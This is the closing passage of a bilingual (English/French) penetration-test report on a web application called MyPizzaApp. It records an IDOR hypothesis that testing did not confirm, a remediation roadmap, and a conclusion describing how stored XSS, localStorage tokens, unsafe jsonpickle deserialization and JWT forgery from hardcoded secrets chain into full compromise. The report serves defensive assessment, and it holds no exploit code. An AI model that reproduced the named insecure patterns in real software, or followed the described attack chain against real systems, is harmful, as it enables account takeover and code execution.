**CWE:** CWE-639 – Authorization Bypass Through User-Controlled Key  
**Affected Component:** User profile endpoints

#### Investigation Result

The user endpoints were reviewed and tested for IDOR behavior. Although the data model and route structure initially suggested a possible direct-object-reference issue, the dynamic testing notes indicate that normal-user tokens received authorization failures before UUID-based access could be abused.
Des tests ont été conduits pour identifier des vulnérabilités IDOR sur les endpoints de profil utilisateur (`/api/users/{user_id}`). Bien que le code source indique que les UUIDs sont utilisés comme identifiants, **l'ensemble du router `/users` requiert des privilèges admin** via la dépendance `validate_user_admin`.
Lors de l'envoi de requêtes GET ou POST vers `/api/users/<target_uuid>` avec le token d'un utilisateur standard, le serveur répond correctement avec `401 Unauthorized` avant même de traiter l'UUID. 

#### Conclusion

This vector was investigated but not achieved in practice during the assessment. It should therefore not be reported as a confirmed finding. It is better recorded as a tested hypothesis that was mitigated by existing authorization checks on the route.



#### Recommendation

Retain the current authorization guard behavior, but continue reviewing object-level access control consistently across all endpoints.


## Remediation Roadmap
### Immediate Priorities
1. Remove unsafe deserialization from the pizza creation flow.
2. Eliminate stored XSS by stopping unsafe HTML rendering and restricting the bot.
3. Rotate all hardcoded secrets and remove them from the repository.
4. Move authentication tokens out of `localStorage`.
5. Block self-service role changes and review every privileged update flow.

### Short-Term Hardening
- Parameterize the SQL category filter.
- Enforce strict validation on all request bodies.
- Lock down image URL handling to trusted domains and schemes.
- Enforce HTTPS everywhere, with HSTS and strict origin policy.
- Remove debug metadata, source maps, and framework-identifying headers from production.

### Longer-Term Improvements
- Redesign authentication and authorization around server-side trust decisions.
- Add secure coding checks in CI for secrets, unsafe deserialization, and dependency risks.
- Add automated tests for authorization boundaries, resource scoping, and input validation.
- Review every administrative action for least-privilege and audit logging.


1. **Supprimer toute désérialisation non-sécurisée** : bannir `jsonpickle.decode(safe=False)` de la base de code.
2. **Supprimer `bypassSecurityTrustHtml`** sur des contenus utilisateurs ; utiliser le rendu texte brut.
3. **Externaliser tous les secrets** via un secrets manager ; ne jamais les committer.
4. **Migrer les tokens vers des cookies HttpOnly** ; éliminer le stockage `localStorage` pour les tokens d'authentification.
5. **Implémenter les contrôles d'autorisation côté serveur** pour chaque action privilégiée ; les guards Angular ne sont qu'une UX.
6. **Paramétrer toutes les requêtes SQL** ; utiliser l'ORM SQLAlchemy sans interpolation de chaînes.
7. **Valider strictement toutes les entrées** avec des modèles Pydantic et des allowlists côté serveur.
8. **Renforcer la configuration JWT** : algorithme asymétrique (RS256/EdDSA), secrets à haute entropie, rate-limiting sur `/token`.
9. **Forcer HTTPS** avec redirection 301 depuis HTTP et HSTS.
10. **Appliquer le principe du moindre privilège** : l'application ne doit pas tourner en `root`; créer un utilisateur dédié avec des permissions minimales.
11. **Désactiver les sourcemaps en production** et ajouter les headers de sécurité Nginx.
12. **Auditer les dépendances** régulièrement avec `npm audit` et `pip-audit` ; utiliser des builds reproductibles.



## Conclusion
MyPizzaApp contains several independent high-impact vulnerabilities and, more importantly, they chain together cleanly into full application compromise. The most dangerous combination is stored XSS plus insecure token storage plus unsafe deserialization, but the environment also permits a separate direct route through JWT forgery because secrets are hardcoded and trust is placed in attacker-controlled token content.

From a defender's perspective, the application currently lacks a reliable security boundary between normal users and administrators. The remediation effort should therefore focus first on removing code execution primitives and restoring trust boundaries in authentication, authorization, and input handling.
